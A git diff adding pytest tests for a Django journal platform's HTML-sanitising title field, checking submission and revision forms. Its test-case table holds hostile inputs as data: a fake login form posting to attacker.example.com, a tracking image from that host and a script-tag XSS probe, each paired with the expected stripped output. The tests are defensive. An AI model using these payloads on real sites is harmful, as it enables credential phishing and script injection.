@@ -1,14 +1,33 @@
 """Test related to the submission process."""
 
 import pytest
+from django import forms
 from django.contrib.auth import get_user_model
 from django.test.client import Client
 from django.urls import reverse
-from submission.models import Article
+from submission.models import Article, Keyword, Licence, Section
 
-from wjs.jcom_profile.models import JCOMProfile
+from wjs.jcom_profile.forms import KeywordSelectionArticleInfoSubmit
+from wjs.jcom_profile.models import JCOMProfile, WjsSimpleBleach
+
+from ..forms import EditorRevisionRequestForm
 
 Account = get_user_model()
+
+# --- Tabella casi: input -> output atteso ---
+BLEACH_CASES = [
+    ('Questo testo è tutto "ammmesso" anche le ".', 'Questo testo è tutto "ammmesso" anche le ".'),
+    ("S&T coverage in English-language Indian dailies", "S&amp;T coverage in English-language Indian dailies"),
+    ("<iframe>TEST with & H1</iframe>", "TEST with &amp; H1"),
+    (
+        """Fake form<form action="https://attacker.example.com" method="POST"><input type="text" name="username" /><input type="submit" value="Invia" /></form>""",  # noqa E501
+        "Fake form",
+    ),
+    ("""fake image <img src="https://attacker.example.com/track.png" alt="Immagine" />""", "fake image "),
+    ("""Fake script <script>alert('XSS')</script>""", "Fake script alert('XSS')"),
+    ("&<>", "&amp;&lt;&gt;"),
+    ("<!--Try to remove me!-->&<><!--End-->", "&amp;&lt;&gt;"),
+]
 
 
 @pytest.mark.django_db
@@ -54,3 +73,53 @@ def test_create_coauthor_during_submission(
     # but it's not active (this is a problem)
     assert Account.objects.get(email=new_email)
     assert not Account.objects.get(email=new_email).is_active
+
+
+@pytest.mark.parametrize(("string_with_tag", "bleached_string"), BLEACH_CASES)
+def test_bleach_title_param(string_with_tag, bleached_string):
+    """Test a html string into title with some special chars"""
+
+    class TestBleach(forms.Form):
+        title = WjsSimpleBleach()
+
+    form = TestBleach(data={"title": string_with_tag})
+    assert form.is_valid()
+    title = form.cleaned_data["title"]
+    assert title == bleached_string
+
+
+@pytest.mark.parametrize(("string_with_tag", "bleached_string"), BLEACH_CASES)
+@pytest.mark.django_db
+def test_submission_form(sections, article, journal, string_with_tag, bleached_string):
+    keyword = Keyword.objects.filter(journal=journal).first()
+    licence = Licence.objects.filter(journal=journal).first()
+    section = Section.objects.filter(journal=journal).first()
+
+    form = KeywordSelectionArticleInfoSubmit(
+        data={
+            "title": string_with_tag,
+            "abstract": "test",
+            "section": section,
+            "license": licence,
+            "keywords": [keyword],
+        },
+        journal=journal,
+        instance=article,
+    )
+    assert form.is_valid()
+    title = form.cleaned_data["title"]
+    assert title == bleached_string
+    instance = form.save()
+    assert instance.title == bleached_string
+
+
+@pytest.mark.parametrize(("string_with_tag", "bleached_string"), BLEACH_CASES)
+@pytest.mark.django_db
+def test_revision_form(editor_revision, string_with_tag, bleached_string):
+
+    form = EditorRevisionRequestForm(data={"title": string_with_tag, "abstract": "test"}, instance=editor_revision)
+    assert form.is_valid()
+    title = form.cleaned_data["title"]
+    assert title == bleached_string
+    instance = form.save()
+    assert instance.title == bleached_string
